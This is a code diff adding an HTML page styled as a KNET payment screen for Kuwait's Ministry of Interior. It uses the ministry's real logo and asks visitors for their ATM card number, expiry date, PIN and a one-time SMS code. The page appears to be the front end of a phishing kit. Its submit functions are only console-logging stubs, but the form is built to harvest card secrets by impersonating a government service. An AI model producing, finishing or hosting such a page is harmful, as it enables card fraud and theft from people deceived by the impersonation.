@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html dir="ltr" lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
+    <title>KNET Payment</title>
+    <link rel="stylesheet" href="css/payment-layout-ar.css">
+    <script src="js/jquery-3.7.1.min.js"></script>
+    <style>
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(255,255,255,0.8);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+        body { text-align: left; }
+        .row { display: flex; flex-direction: row; }
+        .paymentlabel { text-align: left; }
+    </style>
+</head>
+<body>
+    <div class="wrapper">
+        <img src="https://www.moi.gov.kw/main/images/assets/common/logo-moi.svg" class="logoHead" alt="MOI Logo">
+        
+        <div class="contentBox" id="PayPageEntry">
+            <div class="paymentheader">Invoice Information</div>
+            
+            <div class="row">
+                <div class="paymentlabel">Beneficiary:</div>
+                <div class="paymentdata">Ministry of Interior</div>
+            </div>
+            
+            <div class="row">
+                <div class="paymentlabel">Website:</div>
+                <div class="paymentdata">www.moi.gov.kw</div>
+            </div>
+            
+            <div class="row">
+                <div class="paymentlabel">Amount:</div>
+                <div class="paymentdata"><span id="displayAmount">0.000</span> KWD</div>
+            </div>
+            
+            <div class="paymentheader" style="margin-top:20px;">Card Information</div>
+            
+            <div style="margin-bottom:15px;">
+                <div class="paymentlabel" style="margin-bottom:5px; display:block;">ATM Card Number:</div>
+                <input type="text" id="debitNumber" class="paymentinput" placeholder="Card Number" maxlength="19">
+            </div>
+            
+            <div style="margin-bottom:15px; display:flex; gap:20px;">
+                <div style="flex:1;">
+                    <div class="paymentlabel" style="margin-bottom:5px; display:block;">Expiry Date:</div>
+                    <div class="expiry-wrapper">
+                        <input type="text" id="expiryMonthBox" class="expiry-input" placeholder="MM" maxlength="2">
+                        <span style="align-self:center;">/</span>
+                        <input type="text" id="expiryYearBox" class="expiry-input" placeholder="YY" maxlength="2">
+                    </div>
+                </div>
+                <div style="flex:1;">
+                    <div class="paymentlabel" style="margin-bottom:5px; display:block;">PIN Code:</div>
+                    <input type="password" id="cardPin" class="paymentinput" placeholder="****" maxlength="4">
+                </div>
+            </div>
+            
+            <div class="button-container">
+                <input type="button" id="proceed" class="button" value="Submit" onclick="window.onPay()">
+                <input type="button" id="cancel" class="button" value="Cancel" onclick="window.cancelPage()">
+            </div>
+        </div>
+
+        <div class="contentBox" id="payConfirm" style="display:none;">
+            <div class="paymentheader">Payment Confirmation</div>
+            <p style="text-align:center; margin-bottom:20px;">Please enter the verification code (OTP) sent to your phone</p>
+            
+            <div class="row">
+                <div class="paymentlabel">Card Number:</div>
+                <div class="paymentdata" id="DCNumber">**** **** **** 1234</div>
+            </div>
+            
+            <div style="margin-top:20px;">
+                <input type="text" id="debitOTPtimer" class="paymentinput" placeholder="OTP Code" maxlength="6">
+            </div>
+            
+            <div class="button-container">
+                <input type="button" id="proceedConfirm" class="button" value="Confirm" onclick="window.payConfirmAjax('VALIDATE')">
+                <input type="button" id="confirmcancel" class="button" value="Cancel" onclick="window.cancelPage()">
+            </div>
+        </div>
+
+        <div id="loading" class="loading-overlay">
+            <div style="border: 4px solid #f3f3f3; border-top: 4px solid #0077D5; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite;"></div>
+            <p style="margin-top:10px;">Processing...</p>
+        </div>
+    </div>
+
+    <style>
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+
+    <script>
+        window.onPay = function() { console.log("Pay clicked"); };
+        window.payConfirmAjax = function() { console.log("Confirm clicked"); };
+        window.cancelPage = function() { console.log("Cancel clicked"); };
+        
+        $(document).ready(function() {
+            $('#debitNumber').on('input', function() {
+                this.value = this.value.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim();
+            });
+            $('#cardPin, #expiryMonthBox, #expiryYearBox, #debitOTPtimer').on('input', function() {
+                this.value = this.value.replace(/\D/g, '');
+            });
+        });
+    </script>
+</body>
+</html>
